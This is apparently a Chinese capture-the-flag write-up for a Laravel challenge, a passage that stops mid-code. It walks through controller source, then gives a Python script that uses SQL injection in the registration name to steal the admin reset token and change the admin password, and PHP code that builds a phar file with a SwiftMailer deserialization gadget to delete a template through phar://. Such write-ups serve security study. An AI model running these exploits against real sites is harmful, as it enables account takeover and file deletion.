<p>在<code>FlagController</code>中可以知道flag文件名为<code>/th1s1s_F14g_2333333</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/th1s1s_F14g_2333333&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&#x27;auth.flag&#x27;</span>)-&gt;with(<span class="string">&#x27;flag&#x27;</span>, <span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>UploadController</code>只允许admin访问，upload方法会对文件后缀进行检测只能是图片或者是gif</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">UploadRequest <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;file(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$file</span> &amp;&amp; <span class="variable">$file</span>-&gt;isValid())) &#123;</span><br><span class="line">        <span class="variable">$allowed_extensions</span> = [<span class="string">&quot;bmp&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = <span class="variable">$file</span>-&gt;getClientOriginalExtension();</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, <span class="variable">$allowed_extensions</span>))&#123;</span><br><span class="line">            <span class="variable">$file</span>-&gt;move(<span class="keyword">$this</span>-&gt;path, <span class="variable">$file</span>-&gt;getClientOriginalName());</span><br><span class="line">            Flash::success(<span class="string">&#x27;上传成功&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> redirect(route(<span class="string">&#x27;upload&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Flash::error(<span class="string">&#x27;上传失败&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> redirect(route(<span class="string">&#x27;upload&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而check方法允许传path和filename，并且会将这两个拼接进行检测文件是否存在，不管怎么样都很容易想到可以写入一些协议来获取flag或者利用phar协议触发反序列化……</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$request</span>-&gt;input(<span class="string">&#x27;path&#x27;</span>, <span class="keyword">$this</span>-&gt;path);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$request</span>-&gt;input(<span class="string">&#x27;filename&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filename</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$path</span> . <span class="variable">$filename</span>))&#123;</span><br><span class="line">            Flash::error(<span class="string">&#x27;磁盘文件已删除，刷新文件列表&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Flash::success(<span class="string">&#x27;文件有效&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> redirect(route(<span class="string">&#x27;files&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>NoteController</code>中可以发现存在很明显的SQL注入，那我们一开始的点就从这里开始了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Note <span class="variable">$note</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$username</span> = Auth::user()-&gt;name;</span><br><span class="line">    <span class="variable">$notes</span> = DB::select(<span class="string">&quot;SELECT * FROM `notes` WHERE `author`=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;note&#x27;</span>, compact(<span class="string">&#x27;notes&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x02-SQL"><a href="#0x02-SQL" class="headerlink" title="0x02:SQL"></a>0x02:SQL</h3><p>查询token并修改admin密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">Url = <span class="string">&#x27;http://02bd8596-dd4e-4b6a-8457-38ed953dea29.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCSRFToken</span>(<span class="params">url</span>):</span>  <span class="comment"># &#123;&quot;csrfToken&quot;:&quot;NHvZDMlQGmLfCmATe4gJIedESNKK7cF8kDq8ItSM&quot;&#125;</span></span><br><span class="line">    r = req.get(url)</span><br><span class="line">    zz = re.<span class="built_in">compile</span>(<span class="string">&#x27;\&#123;\&quot;csrfToken\&quot;\:\&quot;([a-zA-Z0-9]&#123;0,&#125;)\&quot;\&#125;&#x27;</span>)</span><br><span class="line">    res = zz.findall(r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;_token = &quot;</span> + res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_to_note</span>(<span class="params">payload</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;_token&#x27;</span>: getCSRFToken(Url+<span class="string">&#x27;register&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;12&#123;&#125;@qq.&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(random() * <span class="number">26</span> + <span class="number">97</span>))) + </span><br><span class="line">            <span class="built_in">chr</span>(<span class="built_in">int</span>(random() * <span class="number">26</span> + <span class="number">97</span>)) + <span class="built_in">chr</span>(<span class="built_in">int</span>(random() * <span class="number">26</span> + <span class="number">97</span>)) + <span class="built_in">chr</span>(<span class="built_in">int</span>(random() * <span class="number">26</span> + <span class="number">97</span>)),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password_confirmation&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    r = req.post(url=Url+<span class="string">&#x27;register&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[*]Register Success!!!&#x27;</span>)</span><br><span class="line">        r2 = req.get(url=Url+<span class="string">&#x27;note&#x27;</span>)</span><br><span class="line">        a = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;div class=&quot;col-xs-10&quot;&gt; ([0-9a-zA-Z]+) &lt;/div&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r2.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;col-xs-10&#x27;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            <span class="built_in">print</span>(a.findall(r2.text))</span><br><span class="line">            resetToken = a.findall(r2.text)</span><br><span class="line">            <span class="keyword">return</span> resetToken</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;Whoops&#x27;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_password</span>(<span class="params">token</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;_token&#x27;</span>: getCSRFToken(Url+<span class="string">&#x27;password/reset/&#x27;</span>+token),</span><br><span class="line">            <span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;admin@qvq.im&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password_confirmation&#x27;</span>: <span class="string">&#x27;123456&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">    r = req.post(url=Url+<span class="string">&#x27;password/reset&#x27;</span>, data=data)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[*]Reset password success!!&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    answer = <span class="string">&quot;1&#x27; union select 1,(select token from password_resets where email=&#x27;admin@qvq.im&#x27; limit 1),3,4,5-- &quot;</span></span><br><span class="line">    token = register_to_note(payload=answer)[<span class="number">0</span>]</span><br><span class="line">    reset_password(token)</span><br></pre></td></tr></table></figure>

<h3 id="0x03-Blade"><a href="#0x03-Blade" class="headerlink" title="0x03:Blade"></a>0x03:Blade</h3><p>登录admin账号之后，虽然flag页面可以访问，但是却没有东西</p>
<p>所以需要把之前的模板文件删掉再去访问flag</p>
<p>之前也提到过可在<code>file_exists</code>利用phar协议触发反序列化，并且还存在文件上传，这就是极好的机会了，直接全局搜索unlink或者<code>__destruct</code>，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">        @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以现在就是找到改模板文件的文件名了</p>
<p><a href="https://blog.csdn.net/weixin_43610673/article/details/107777433">https://blog.csdn.net/weixin_43610673/article/details/107777433</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_path</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filepath</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = <span class="variable">$filepath</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Swift_IoException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// /var/www/html/resources/views/auth/flag.blade.php =&gt; 73eb5933be1eb2293500f4a74b45284fd453f0bb</span></span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&#x27;/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php&#x27;</span>;</span><br><span class="line">        <span class="built_in">parent</span>::__construct(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream());</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;symlink.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>生成phar文件之后，进行文件上传并且抓包修改后缀名，再在check页面执行phar协议触发反序列化删除未及时删除的flag模板文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;path = storage_path(<span class="string">&#x27;app/public&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">path=phar:///var/www/html/storage/app/public</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Write sequence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_sequence</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StreamFilters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_StreamFilter[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filters</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A buffer for writing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_writeBuffer</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bound streams.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_InputByteStream[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_mirrors</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add a StreamFilter to this InputByteStream.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Swift_StreamFilter $filter</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string             $key</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFilter</span>(<span class="params">Swift_StreamFilter <span class="variable">$filter</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filters[<span class="variable">$key</span>] = <span class="variable">$filter</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Remove an already present StreamFilter based on its $key.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $key</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFilter</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;_filters[<span class="variable">$key</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes $bytes to the end of the stream.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $bytes</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Swift_IoException</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$bytes</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_writeBuffer .= <span class="variable">$bytes</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filters <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$filter</span>-&gt;shouldBuffer(<span class="keyword">$this</span>-&gt;_writeBuffer)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_doWrite(<span class="keyword">$this</span>-&gt;_writeBuffer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ++<span class="keyword">$this</span>-&gt;_sequence;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * For any bytes that are currently buffered inside the stream, force them</span></span><br><span class="line"><span class="comment">     * off the buffer.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Swift_IoException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_doWrite(<span class="keyword">$this</span>-&gt;_writeBuffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Attach $is to this stream.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The stream acts as an observer, receiving all data that is written.</span></span><br><span class="line"><span class="comment">     * All &#123;<span class="doctag">@link</span> write()&#125; and &#123;<span class="doctag">@link</span> flushBuffers()&#125; operations will be mirrored.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Swift_InputByteStream $is</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">Swift_InputByteStream <span class="variable">$is</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mirrors[] = <span class="variable">$is</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Remove an already bound stream.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If $is is not bound, no errors will be raised.</span></span><br><span class="line"><span class="comment">     * If the stream currently has any buffered data it will be written to $is</span></span><br><span class="line"><span class="comment">     * before unbinding occurs.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Swift_InputByteStream $is</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unbind</span>(<span class="params">Swift_InputByteStream <span class="variable">$is</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_mirrors <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$stream</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$is</span> === <span class="variable">$stream</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_writeBuffer !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$stream</span>-&gt;write(<span class="keyword">$this</span>-&gt;_writeBuffer);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;_mirrors[<span class="variable">$k</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Flush the contents of the stream (empty it) and set the internal pointer</span></span><br><span class="line"><span class="comment">     * to the beginning.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Swift_IoException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flushBuffers</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_writeBuffer !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_doWrite(<span class="keyword">$this</span>-&gt;_writeBuffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_flush();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_mirrors <span class="keyword">as</span> <span class="variable">$stream</span>) &#123;</span><br><span class="line">            <span class="variable">$stream</span>-&gt;flushBuffers();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Run $bytes through all filters */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_filter</span>(<span class="params"><span class="variable">$bytes</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filters <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="variable">$bytes</span> = <span class="variable">$filter</span>-&gt;filter(<span class="variable">$bytes</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bytes</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Just write the bytes to the stream */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_doWrite</span>(<span class="params"><span class="variable">$bytes</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_commit(<span class="keyword">$this</span>-&gt;_filter(<span class="variable">$bytes</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_mirrors <span class="keyword">as</span> <span class="variable">$stream</span>) &#123;</span><br><span class="line">            <span class="variable">$stream</span>-&gt;write(<span class="variable">$bytes</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_writeBuffer = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span></span>&#123;</span><br><span class="line">    <span class="comment">/** The internal pointer offset */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_offset</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The path to the file */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The mode this file is opened in for writing */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_mode</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for reading the file */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_reader</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for writing the file */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_writer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If magic_quotes_runtime is on, this will be true */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_quotes</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If stream is seekable true/false, or null if not known */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_seekable</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new FileByteStream for $path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool   $writable if true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$writable</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Swift_IoException(<span class="string">&#x27;The path cannot be empty&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mode = <span class="variable">$writable</span> ? <span class="string">&#x27;w+b&#x27;</span> : <span class="string">&#x27;rb&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">&#x27;get_magic_quotes_runtime&#x27;</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_quotes = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the complete path to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPath</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Swift_IoException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// /var/www/html/resources/views/auth/flag.blade.php =&gt; 73eb5933be1eb2293500f4a74b45284fd453f0bb</span></span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&#x27;/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php&#x27;</span>;</span><br><span class="line">        